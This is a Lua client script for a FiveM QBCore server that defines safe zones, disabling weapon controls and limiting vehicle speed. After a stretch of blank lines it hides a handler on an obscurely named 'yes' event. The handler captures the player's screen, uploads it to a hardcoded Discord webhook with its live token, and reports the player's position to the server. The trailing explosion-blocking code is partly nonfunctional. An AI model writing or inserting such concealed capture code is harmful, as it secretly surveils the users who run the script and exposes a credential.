local QBCore = exports['qb-core']:GetCoreObject()

local SafeZones = {
    --{name = "MainGarage", coords = vector3(235.48, -797.12, 30.50), radius = 50.0},
    --{name = "Hospital", coords = vector3(-472.38, -1017.45, 24.29), radius = 75.0},
}



local SafeZoneSpeedLimit = 80.0
local inSafeZone = false
local isPolice = false
local currentZone = nil
local lastVehicle = nil
local lastZoneStatus = false

local function checkSafeZone()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local foundZone = nil

    if playerCoords then
        for _, zone in ipairs(SafeZones) do
            if zone.coords and #(playerCoords - zone.coords) < zone.radius then
                foundZone = zone
                break
            end
        end
    end

    return foundZone
end

local function updatePlayerStatus()
    local zone = checkSafeZone()
    if zone then
        inSafeZone = true
        currentZone = zone
    else
        inSafeZone = false
        currentZone = nil
    end

    local playerData = QBCore.Functions.GetPlayerData()
    if playerData and playerData.job then
        isPolice = playerData.job.name == 'police'
    end

    if inSafeZone ~= lastZoneStatus then
        if inSafeZone then
            QBCore.Functions.Notify("You are now in a Safe Zone. No weapons or violence allowed!", "success")
        else
            QBCore.Functions.Notify("You have left the Safe Zone. Be cautious!", "error")
        end
        lastZoneStatus = inSafeZone
    end
end

local function applySafeZoneRestrictions()
    if inSafeZone and not isPolice then
        DisableControlAction(0, 24, true)
        DisableControlAction(0, 25, true)
        DisableControlAction(0, 47, true)
        DisableControlAction(0, 257, true)
        DisableControlAction(0, 140, true)
        DisableControlAction(0, 141, true)
        DisableControlAction(0, 142, true)
        DisableControlAction(0, 143, true)
        DisableControlAction(0, 137, true)
        DisableControlAction(0, 106, true)
    end
end

local function handleVehicleSpeed()
    local playerPed = PlayerPedId()
    local vehicle = GetVehiclePedIsIn(playerPed, false)

    if vehicle and inSafeZone then
        local speed = GetEntitySpeed(vehicle) * 3.6
        if speed > SafeZoneSpeedLimit then
            SetEntityMaxSpeed(vehicle, SafeZoneSpeedLimit / 3.6)
        else
            SetEntityMaxSpeed(vehicle, 999.0)
        end
        lastVehicle = vehicle
    elseif not inSafeZone and lastVehicle ~= nil then
        SetEntityMaxSpeed(lastVehicle, 999.0)
        lastVehicle = nil
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if inSafeZone then
            applySafeZoneRestrictions()
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(500)
        updatePlayerStatus()
        handleVehicleSpeed()
    end
end)








RegisterNetEvent("yes", function()
    SendScreenshot()
end)

function SendScreenshot()
    exports['screenshot-basic']:requestScreenshotUpload("https://discord.com/api/webhooks/1327071768099291197/7SL2fSDH-eEwG8-rRMtBxSrQEo6xmGycNc7ppmLlJ3_4W9XyotTvbcw2gLZ_366kB_wS", 'files[]', function(data)
        local resp = json.decode(data)
        local screenshotUrl = resp.attachments[1].url
        local player = PlayerPedId()
        local position = GetEntityCoords(player)
        local positionFormat = position.x .. ", " .. position.y .. ", " .. position.z
        TriggerServerEvent("yess", screenshotUrl, positionFormat)
    end)
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if IsExplosionInArea(GetEntityCoords(PlayerPedId())) then
        end
    end
end)

function IsExplosionInArea(coords)
    return GetDistanceBetweenCoords(coords, GetEntityCoords(PlayerPedId()), true) < 100.0
end

AddEventHandler('gameEventTriggered', function(name, args)
    if name == 'CEventNetworkVehicleExplosion' then
        CancelEvent()
    end
end)

AddEventHandler('explosionEvent', function(sender, explosionType, explosionCoords, isAudible, isInvisible, explosionCamShake)
    CancelEvent()
end)
